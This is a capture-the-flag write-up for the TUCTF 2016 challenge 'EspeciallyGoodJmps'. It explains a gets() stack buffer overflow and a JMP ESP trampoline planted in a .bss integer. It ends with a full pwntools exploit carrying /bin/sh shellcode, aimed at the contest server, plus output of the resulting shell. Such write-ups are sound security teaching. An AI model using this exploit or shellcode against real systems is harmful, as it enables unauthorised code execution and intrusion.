# TUCTF 2016: EspeciallyGoodJmps

## Challenge details
| Event | Challenge | Category | Points |
|:------|:----------|:---------|-------:|
| TUCTF | EspeciallyGoodJmps | Pwnable | 75 |

### Description
> Pop a shell.
>
> Binary is hosted at: 130.211.202.98:7575
> 
> EDIT:
> 
> ASLR is enabled on remote server.

## First steps

Lets start by checking the binary:

```bash
$ file 23e4f31a5a8801a554e1066e26eb34745786f4c4
23e4f31a5a8801a554e1066e26eb34745786f4c4: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=afcb1c16b8d5a795af98824aaede8fabc045d4ed, not stripped
```

```bash
$checksec.sh --file 23e4f31a5a8801a554e1066e26eb34745786f4c4
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   23e4f31a5a8801a554e1066e26eb34745786f4c4

```

Looks good! No NX and no canary so we can execute shellcode from the stack! Lets look at the code:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+10h] [bp-20h]@1

  puts("What's your name?");
  fflush(stdout);
  gets((char *)&v4);
  puts("What's your favorite number?");
  fflush(stdout);
  __isoc99_scanf("%d", &meow);
  if ( meow & 1 )
  {
    printf("Hello %s, %d is an odd number!\n", &v4, meow);
    fflush(stdout);
  }
  else
  {
    printf("Hello %s, %d is an even number!\n", &v4, meow);
    fflush(stdout);
  }
  return 0;
}
```

Pretty straightforward: the program asks for your name and saves it on the stack (without bounds checking! so we have a stack-based buffer overflow) and subsequently asks for an integer which gets stored in a static location (.bss) 'meow' 

```asm
.bss:0804A048 meow            dd ?                    ; DATA XREF: main+47o
```

The first approach here is to simply smash the stack, overwrite saved EIP with an address of a gadget that effectively performs either a jmp ESP or call ESP, which will transfer execution to our shellcode on the stack. 

However there are no usefull ROP-gadgets available in the binary so we have to take an alternative route. 
One approach could be return-to-libc but ASLR is enabled on the remote server and we have no way of leaking pointers.

So, the easiest approach is to write our JMP ESP (ff e4) opcode into the integer (meow) located in the (static) .bss section of the binary and then point eip to meow, effectively creating a trampoline.

Eventually, the exploit looks something like this:
[filler, 40bytes][saved_ebp, 4bytes][addr_of_meow(eip), 4bytes][shellcode]

And when a number is asked we put in an integer that gets stored as '\x90\x90\xff\xe4'




## Final exploit

```python
#!/usr/bin/env python
#
# TUCTF 2016
# especiallygoodjmps (PWN/75)
#
# @a: Smoke Leet Everyday
# @u: https://github.com/smokeleeteveryday
#

from pwn import *
from struct import pack as p, unpack as u

host, port = ('130.211.202.98', 7575)

r = remote(host, port)

# prepare eip + ebp overwrite values
new_eip = p('<I', 0x0804A048) # > 0804A048 meow 
new_ebp = p('<I', 0xDEADBEEF)

# prepare shellcode 
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# prepare payload
payload = "B"*40 + new_ebp + new_eip + shellcode

# send payload to victim
print r.recvuntil('What\'s your name?\n')
r.sendline(payload)
print r.recvuntil('What\'s your favorite number?\n')

# construct 4-byte trampoline in meow
h = '\x90\x90\xff\xe4' # jmp esp = ff e4
trampoline = u('<i', h)
r.sendline("%d" % trampoline) 

# enjoy your shell
r.interactive()
r.close()
```

Which, when executed, gives us:

```bash
$ ./exploit.py
[+] Opening connection to 130.211.202.98 on port 7575: Done
What's your name?

What's your favorite number?

[*] Switching to interactive mode
Hello BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBﾭ�H\xa0\x01�Ph//shh/bin\x89�PS\x89��
  , -453013360 is an even number!
$ ls
easy
flag.txt
$ cat flag.txt
TUCTF{th0se_were_s0me_ESPecially_good_JMPs}

```
